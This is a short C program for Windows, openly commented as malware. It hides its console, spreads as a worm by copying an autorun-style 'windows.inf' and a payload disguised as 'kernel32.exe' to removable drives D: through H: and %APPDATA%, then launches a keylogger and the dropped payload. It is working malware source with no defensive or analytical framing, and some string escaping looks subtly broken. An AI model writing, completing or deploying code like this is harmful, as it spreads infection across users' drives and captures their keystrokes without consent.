#include <stdio.h>
#include <string.h>
#include <Windows.h>

#define WINDOWS_INF    "AUTOC"
#define DROP_FILE_NAME "kernel32.exe"
#define HIDE           0

void xcp();

int main(int argc, char **argv) {
    // Hide
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, HIDE);
    // if was not copied
    if(fopen("D:\\" DROP_FILE_NAME, "r") == NULL) 
        // worm
        xcp(); // copy
    // Active the keylogger
    system("start key.exe");
    // Active the malware
    system("start %%APPDATA%%\\" DROP_FILE_NAME);
    return 0;
}

void xcp() {
    char shell[] = 
"echo f | xcopy /e /y "WINDOWS_INF" D:\\windows.inf\n\
echo f | xcopy /e /y "WINDOWS_INF" E:\\windows.inf\n\
echo f | xcopy /e /y "WINDOWS_INF" F:\\windows.inf\n\
echo f | xcopy /e /y "WINDOWS_INF" G:\\windows.inf\n\
echo f | xcopy /e /y "WINDOWS_INF" H:\\windows.inf\n";
    char shell2[] =
"xcopy /e /y "DROP_FILE_NAME" %%APPDATA%%\n\
xcopy /e /y "DROP_FILE_NAME" D:\\\n\
xcopy /e /y "DROP_FILE_NAME" E:\\\n\
xcopy /e /y "DROP_FILE_NAME" F:\\\n\
xcopy /e /y "DROP_FILE_NAME" G:\\\n\
xcopy /e /y "DROP_FILE_NAME" H:\\";
    system(shell);
    system(shell2);
}
